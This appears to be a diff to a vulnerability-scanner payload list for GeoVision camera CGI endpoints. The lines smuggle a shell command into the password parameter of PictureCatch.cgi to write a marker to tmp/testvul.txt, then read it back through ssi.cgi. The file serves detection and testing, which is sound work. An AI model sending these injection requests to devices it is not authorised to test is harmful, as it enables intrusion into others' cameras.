@@ -1,2 +1,3 @@
 /PictureCatch.cgi?username=GEOVISION&password=%3Becho%204621d373cade4e83>tmp%2ftestvul.txt%3B&data_type=1&attachment=1&channel=1&secret=1&key=PWNED
 /ssi.cgi/tmp/testvul.txt
+/PictureCatch.cgi?username=GEOVISION&password=%3Becho%20%2dn%204621d373cade4e83>tmp%2ftestvul.txt%3Becho%20%2dn%20alow>>tmp%2ftestvul.txt&data_type=1&attachment=1&channel=1&secret=1&key=PWNED
